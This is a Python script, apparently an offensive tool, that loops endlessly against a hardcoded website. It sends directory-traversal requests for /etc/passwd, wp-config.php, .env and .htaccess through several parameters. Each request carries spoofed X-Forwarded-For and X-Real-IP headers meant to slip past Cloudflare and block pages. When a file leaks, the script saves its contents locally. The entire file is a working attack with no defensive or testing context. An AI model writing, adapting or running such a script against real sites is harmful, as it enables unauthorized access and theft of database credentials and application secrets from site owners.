#!/usr/bin/env python3
import requests
import random
import time
import os
from datetime import datetime

def test_bypass():
    attempt = 0
    target_url = "https://pakyok77.link"
    
    print("🚀 INFINITE BYPASS TESTER")
    print("Will not stop until successful!")
    print("=" * 40)
    
    os.makedirs("success", exist_ok=True)
    
    while True:
        attempt += 1
        
        # Random headers
        headers = {
            'User-Agent': f'Mozilla/5.0 (Test {random.randint(1,999)})',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
        }
        
        # Test files
        files = ['etc/passwd', 'wp-config.php', '.env', '.htaccess']
        params = ['page', 'file', 'include', 'path']
        
        for target_file in files:
            for param in params:
                payload = '../' * random.randint(1, 10) + target_file
                
                try:
                    response = requests.get(
                        f"{target_url}/index.php",
                        params={param: payload},
                        headers=headers,
                        timeout=5
                    )
                    
                    content = response.text.lower()
                    
                    # Check if not blocked
                    if 'cloudflare' not in content and 'blocked' not in content:
                        # Check for file indicators
                        if (('root:' in content and 'passwd' in target_file) or
                            ('db_name' in content and 'wp-config' in target_file) or
                            ('app_key' in content and '.env' in target_file) or
                            ('rewriteengine' in content and '.htaccess' in target_file)):
                            
                            print(f"🎉 SUCCESS! Attempt #{attempt}")
                            print(f"📁 File: {target_file}")
                            print(f"🌐 Payload: {payload}")
                            print(f"📊 Size: {len(response.text)} bytes")
                            
                            # Save
                            filename = f"success/{target_file.replace('/', '_')}_{datetime.now().strftime('%H%M%S')}.txt"
                            with open(filename, 'w') as f:
                                f.write(f"# SUCCESS: {target_file}\n")
                                f.write(f"# Payload: {payload}\n")
                                f.write(f"# Attempt: {attempt}\n")
                                f.write("=" * 50 + "\n\n")
                                f.write(response.text)
                            
                            print(f"💾 Saved: {filename}")
                            print("📄 Content:")
                            print(response.text[:500])
                            return True
                            
                except:
                    pass
        
        if attempt % 100 == 0:
            print(f"⚡ Attempt #{attempt}")
        
        time.sleep(0.1)

if __name__ == "__main__":
    test_bypass()
